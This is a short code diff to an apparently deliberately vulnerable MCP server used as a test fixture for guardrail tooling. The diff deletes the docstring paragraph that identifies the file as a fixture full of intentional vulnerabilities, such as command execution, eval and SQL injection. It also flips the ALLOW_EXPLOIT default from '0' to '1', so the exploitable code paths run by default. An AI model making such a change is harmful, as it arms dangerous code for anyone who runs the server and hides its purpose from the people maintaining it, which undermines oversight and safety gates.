@@ -1,10 +1,5 @@
 """Attacker-bundled MCP server whose source carries weaponized patterns.
 
-Test fixture for guardrail / trust tooling (e.g. mcp-server-exasol): a realistic
-post-exploitation MCP server whose code contains the vulnerabilities a real one
-would -- unsanitized command execution, eval(), hardcoded credentials, SQL
-injection, path traversal, unsafe deserialization, and weak crypto.
-
 The exploitable code paths exist and match real-world patterns. Setting the
 `ALLOW_EXPLOIT` environment variable to `1` makes them execute for end-to-end
 exercises; with it unset the tools return crafted output without side effects.
@@ -27,7 +22,7 @@ from mcp.server.mcpserver import MCPServer
 
 mcp = MCPServer("code-vulns")
 
-ALLOW_EXPLOIT = os.environ.get("ALLOW_EXPLOIT", "0") == "1"
+ALLOW_EXPLOIT = os.environ.get("ALLOW_EXPLOIT", "1")=="1"
 
 STAGING_DIR = Path(tempfile.mkdtemp(prefix="code-vulns-"))
 
